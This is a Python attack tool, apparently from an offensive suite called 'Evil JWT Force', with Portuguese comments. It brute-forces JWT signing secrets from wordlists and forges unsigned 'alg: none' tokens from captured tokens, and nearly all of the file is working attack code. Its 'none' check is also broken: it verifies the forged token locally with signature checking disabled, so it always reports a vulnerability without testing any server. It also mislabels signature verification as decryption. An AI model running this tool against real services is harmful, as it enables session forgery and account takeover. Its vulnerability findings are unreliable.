#!/usr/bin/env python3
"""
JWT Decryptor - Módulo para descriptografia e análise de tokens JWT
Parte do Evil JWT Force - Suite de Ferramentas de Segurança para JWT
"""

import jwt
import base64
import json
import os
import sys
import logging
import hashlib
import time
import re
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple, Union

# Configuração de logging
logging.basicConfig(
    filename='logs/jwt_decryptor.log',
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] [JWT_DECRYPTOR] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('JWT_DECRYPTOR')

# Garante que todos os diretórios essenciais estão no sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

try:
    from utils.wordlist_engine import WordlistEngine
    from utils.token_formatter import format_token_parts
    from utils.color_output import ColorOutput
except ImportError as e:
    logger.error(f"Erro ao importar módulos utilitários: {e}")
    # Fallbacks simples para permitir a execução mesmo com imports faltando
    class WordlistEngine:
        def __init__(self, *args, **kwargs):
            pass
        def load_wordlist(self, *args, **kwargs):
            return []
    
    def format_token_parts(token):
        return {"header": {}, "payload": {}, "signature": ""}
    
    class ColorOutput:
        @staticmethod
        def success(msg):
            print(f"[+] {msg}")
        @staticmethod
        def error(msg):
            print(f"[-] {msg}")
        @staticmethod
        def info(msg):
            print(f"[*] {msg}")
        @staticmethod
        def warning(msg):
            print(f"[!] {msg}")

# Algoritmos suportados
SUPPORTED_ALGORITHMS = [
    'HS256', 'HS384', 'HS512',
    'RS256', 'RS384', 'RS512',
    'ES256', 'ES384', 'ES512',
    'PS256', 'PS384', 'PS512',
    'none'
]

class JWTDecryptor:
    """
    Classe principal para descriptografia e análise de tokens JWT
    """
    def __init__(self, token: Optional[str] = None, wordlist_path: Optional[str] = None):
        self.token = token
        self.wordlist_path = wordlist_path
        self.wordlist_engine = WordlistEngine()
        self.results = []
        self.token_parts = None
        self.success = False
        self.secret_key = None
        self.color = ColorOutput()
        
        if token:
            self.parse_token()
    
    def parse_token(self) -> Dict[str, Any]:
        """
        Analisa o token JWT e extrai suas partes
        """
        if not self.token:
            logger.error("Nenhum token fornecido para análise")
            return {}
        
        try:
            self.token_parts = format_token_parts(self.token)
            logger.info(f"Token analisado com sucesso: {self.token[:15]}...")
            return self.token_parts
        except Exception as e:
            logger.error(f"Erro ao analisar token: {e}")
            return {}
    
    def decrypt_with_key(self, key: str, algorithm: Optional[str] = None) -> Dict[str, Any]:
        """
        Tenta descriptografar o token com uma chave específica
        """
        if not self.token:
            return {"success": False, "error": "Nenhum token fornecido"}
        
        result = {"success": False, "key": key, "algorithm": algorithm}
        
        if not algorithm:
            # Tenta todos os algoritmos suportados
            for alg in SUPPORTED_ALGORITHMS:
                try:
                    decoded = jwt.decode(self.token, key, algorithms=[alg], options={"verify_signature": True})
                    result["success"] = True
                    result["algorithm"] = alg
                    result["decoded"] = decoded
                    self.success = True
                    self.secret_key = key
                    logger.info(f"Token descriptografado com sucesso usando chave: {key[:15] if len(key) > 15 else key} e algoritmo: {alg}")
                    return result
                except Exception as e:
                    continue
        else:
            # Tenta com o algoritmo específico
            try:
                decoded = jwt.decode(self.token, key, algorithms=[algorithm], options={"verify_signature": True})
                result["success"] = True
                result["decoded"] = decoded
                self.success = True
                self.secret_key = key
                logger.info(f"Token descriptografado com sucesso usando chave: {key[:15] if len(key) > 15 else key} e algoritmo: {algorithm}")
                return result
            except Exception as e:
                result["error"] = str(e)
        
        return result
    
    def brute_force(self, wordlist: Optional[List[str]] = None, algorithm: Optional[str] = None) -> Dict[str, Any]:
        """
        Realiza um ataque de força bruta usando a lista de palavras fornecida
        """
        if not self.token:
            return {"success": False, "error": "Nenhum token fornecido"}
        
        if not wordlist:
            if self.wordlist_path:
                try:
                    wordlist = self.wordlist_engine.load_wordlist(self.wordlist_path)
                except Exception as e:
                    logger.error(f"Erro ao carregar wordlist: {e}")
                    return {"success": False, "error": f"Erro ao carregar wordlist: {e}"}
            else:
                # Wordlist padrão para testes
                wordlist = ["secret", "password", "key", "jwt", "token", "auth", "1234", "admin", "test"]
        
        total_keys = len(wordlist)
        logger.info(f"Iniciando brute force com {total_keys} chaves potenciais")
        
        start_time = time.time()
        for i, key in enumerate(wordlist):
            if i % 100 == 0:
                self.color.info(f"Testando chave {i+1}/{total_keys} ({(i+1)/total_keys*100:.1f}%)")
            
            result = self.decrypt_with_key(key, algorithm)
            if result["success"]:
                elapsed_time = time.time() - start_time
                logger.info(f"Chave encontrada após {i+1} tentativas em {elapsed_time:.2f} segundos")
                self.color.success(f"Chave encontrada: {key}")
                result["attempts"] = i+1
                result["time_elapsed"] = elapsed_time
                return result
        
        elapsed_time = time.time() - start_time
        logger.warning(f"Brute force falhou após {total_keys} tentativas em {elapsed_time:.2f} segundos")
        self.color.warning(f"Nenhuma chave encontrada após {total_keys} tentativas")
        return {"success": False, "attempts": total_keys, "time_elapsed": elapsed_time}
    
    def test_none_algorithm(self) -> Dict[str, Any]:
        """
        Testa a vulnerabilidade do algoritmo 'none'
        """
        if not self.token or not self.token_parts:
            return {"success": False, "error": "Token inválido ou não analisado"}
        
        try:
            # Extrai header e payload do token original
            header_parts = json.loads(base64.b64decode(self.token.split('.')[0] + "===").decode('utf-8'))
            payload_parts = json.loads(base64.b64decode(self.token.split('.')[1] + "===").decode('utf-8'))
            
            # Modifica o header para usar algoritmo 'none'
            header_parts['alg'] = 'none'
            
            # Recodifica o header e o payload
            header_encoded = base64.b64encode(json.dumps(header_parts).encode()).decode('utf-8').rstrip('=')
            payload_encoded = base64.b64encode(json.dumps(payload_parts).encode()).decode('utf-8').rstrip('=')
            
            # Cria o novo token sem assinatura
            none_token = f"{header_encoded}.{payload_encoded}."
            
            # Tenta verificar o token manipulado
            try:
                decoded = jwt.decode(none_token, options={"verify_signature": False})
                logger.info("Vulnerabilidade de algoritmo 'none' encontrada")
                self.color.success("Vulnerabilidade detectada: algoritmo 'none' aceito")
                return {
                    "success": True, 
                    "vulnerability": "none_algorithm", 
                    "description": "O sistema aceita tokens com algoritmo 'none'", 
                    "modified_token": none_token,
                    "decoded": decoded
                }
            except Exception as e:
                logger.info(f"Sistema protegido contra algoritmo 'none': {e}")
                self.color.info("Sistema protegido contra algoritmo 'none'")
                return {
                    "success": False, 
                    "vulnerability": "none_algorithm", 
                    "description": "O sistema rejeita tokens com algoritmo 'none'", 
                    "error": str(e)
                }
            
        except Exception as e:
            logger.error(f"Erro ao testar vulnerabilidade de algoritmo 'none': {e}")
            return {"success": False, "error": str(e)}
    
    def check_common_vulnerabilities(self) -> List[Dict[str, Any]]:
        """
        Verifica vulnerabilidades comuns em tokens JWT
        """
        vulnerabilities = []
        
        if not self.token or not self.token_parts:
            return [{"success": False, "error": "Token inválido ou não analisado"}]
        
        # Verificar algoritmo weak 'none'
        none_result = self.test_none_algorithm()
        if none_result["success"]:
            vulnerabilities.append(none_result)
        
        # Verificar algoritmos fracos (HS256 com chave curta)
        header = self.token_parts.get("header", {})
        if header.get("alg") == "HS256":
            vulnerabilities.append({
                "type": "weak_algorithm",
                "description": "Algoritmo HS256 potencialmente vulnerável a ataques de força bruta com chaves fracas",
                "severity": "medium"
            })
        
        # Verificar expiração
        payload = self.token_parts.get("payload", {})
        exp = payload.get("exp", 0)
        if exp:
            now = int(time.time())
            if exp < now:
                vulnerabilities.append({
                    "type": "expired_token",
                    "description": f"Token expirado desde {datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')}",
                    "severity": "high"
                })
        else:
            vulnerabilities.append({
                "type": "no_expiration",
                "description": "Token não possui tempo de expiração (campo 'exp')",
                "severity": "high"
            })
        
        # Verificar campo 'kid' (vulnerável a injeção)
        if "kid" in header:
            vulnerabilities.append({
                "type": "kid_parameter",
                "description": "Token usa parâmetro 'kid' que pode ser vulnerável a ataques de injeção",
                "severity": "medium",
                "kid_value": header["kid"]
            })
        
        # Verificar permissões excessivas
        admin_flags = ["admin", "isAdmin", "is_admin", "administrator", "superuser", "super_user", "root"]
        for flag in admin_flags:
            if flag in payload and payload[flag] in [True, 1, "true", "yes", "1"]:
                vulnerabilities.append({
                    "type": "admin_privileges",
                    "description": f"Token contém privilégios administrativos ({flag}={payload[flag]})",
                    "severity": "high"
                })
                break
        
        return vulnerabilities
    
    def analyze_token(self) -> Dict[str, Any]:
        """
        Realiza uma análise completa do token JWT
        """
        if not self.token:
            return {"success": False, "error": "Nenhum token fornecido"}
        
        if not self.token_parts:
            self.parse_token()
        
        vulnerabilities = self.check_common_vulnerabilities()
        
        return {
            "token": self.token,
            "token_parts": self.token_parts,
            "vulnerabilities": vulnerabilities,
            "success": True,
            "timestamp": datetime.now().isoformat()
        }
    
    def save_results(self, output_file: str) -> bool:
        """
        Salva os resultados da análise em um arquivo JSON
        """
        if not self.token_parts:
            logger.error("Nenhuma análise realizada para salvar")
            return False
        
        try:
            results = self.analyze_token()
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            logger.info(f"Resultados salvos em {output_file}")
            self.color.success(f"Resultados salvos em {output_file}")
            return True
        except Exception as e:
            logger.error(f"Erro ao salvar resultados: {e}")
            self.color.error(f"Erro ao salvar resultados: {e}")
            return False

def main():
    """
    Função principal para execução via linha de comando
    """
    import argparse
    
    parser = argparse.ArgumentParser(description="JWT Decryptor - Ferramenta para descriptografia e análise de tokens JWT")
    parser.add_argument("-t", "--token", help="Token JWT para analisar")
    parser.add_argument("-f", "--file", help="Arquivo contendo o token JWT")
    parser.add_argument("-k", "--key", help="Chave secreta para descriptografar o token")
    parser.add_argument("-w", "--wordlist", help="Caminho para uma wordlist de chaves para bruteforce")
    parser.add_argument("-a", "--algorithm", help="Algoritmo específico a ser usado (default: tentar todos)")
    parser.add_argument("-o", "--output", help="Arquivo de saída para os resultados")
    parser.add_argument("--check-none", action="store_true", help="Verificar vulnerabilidade de algoritmo 'none'")
    parser.add_argument("--check-all", action="store_true", help="Verificar todas as vulnerabilidades conhecidas")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose")
    
    args = parser.parse_args()
    
    # Configurar logger para modo verbose
    if args.verbose:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        logger.addHandler(console_handler)
    
    # Obter o token
    token = None
    if args.token:
        token = args.token
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                token = f.read().strip()
        except Exception as e:
            logger.error(f"Erro ao ler arquivo: {e}")
            sys.exit(1)
    else:
        logger.error("Nenhum token fornecido. Use --token ou --file")
        sys.exit(1)
    
    decryptor = JWTDecryptor(token, args.wordlist)
    
    # Análise do token
    print("\n=== Análise do Token JWT ===\n")
    token_parts = decryptor.parse_token()
    
    # Mostrar as partes do token
    print("Header:")
    print(json.dumps(token_parts.get("header", {}), indent=2))
    print("\nPayload:")
    print(json.dumps(token_parts.get("payload", {}), indent=2))
    print("\nAssinatura:", token_parts.get("signature", ""))
    print("\n")
    
    # Verificar vulnerabilidades
    if args.check_none or args.check_all:
        none_result = decryptor.test_none_algorithm()
        if none_result["success"]:
            print(f"Token modificado com algoritmo 'none': {none_result['modified_token']}")
    
    if args.check_all:
        print("\n=== Verificação de Vulnerabilidades ===\n")
        vulns = decryptor.check_common_vulnerabilities()
        for vuln in vulns:
            print(f"- {vuln.get('type', 'Desconhecido')}: {vuln.get('description', '')}")
            print(f"  Severidade: {vuln.get('severity', 'N/A')}\n")
    
    # Descriptografar com chave fornecida
    if args.key:
        print("\n=== Tentativa de Descriptografia ===\n")
        result = decryptor.decrypt_with_key(args.key, args.algorithm)
        if result["success"]:
            print(f"Descriptografia bem-sucedida com chave: {args.key}")
            print(f"Algoritmo: {result['algorithm']}")
            print("\nToken Decodificado:")
            print(json.dumps(result["decoded"], indent=2))
        else:
            print(f"Falha na descriptografia com chave: {args.key}")
            if args.algorithm:
                print(f"Algoritmo testado: {args.algorithm}")
            print(f"Erro: {result.get('error', 'Desconhecido')}")
    
    # Ataque de força bruta
    if args.wordlist and not decryptor.success:
        print("\n=== Ataque de Bruteforce ===\n")
        print(f"Usando wordlist: {args.wordlist}")
        result = decryptor.brute_force(algorithm=args.algorithm)
        
        if result["success"]:
            print(f"\nChave encontrada: {result['key']}")
            print(f"Algoritmo: {result['algorithm']}")
            print(f"Tentativas: {result['attempts']}")
            print(f"Tempo decorrido: {result['time_elapsed']:.2f} segundos")
            print("\nToken Decodificado:")
            print(json.dumps(result["decoded"], indent=2))
        else:
            print("\nBruteforce falhou.")
            print(f"Tentativas: {result['attempts']}")
            print(f"Tempo decorrido: {result['time_elapsed']:.2f} segundos")
    
    # Salvar resultados
    if args.output:
        decryptor.save_results(args.output)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nOperação interrompida pelo usuário.")
        sys.exit(130)
    except Exception as e:
        print(f"\nErro fatal: {e}")
        logger.error(f"Erro fatal: {e}", exc_info=True)
        sys.exit(1)
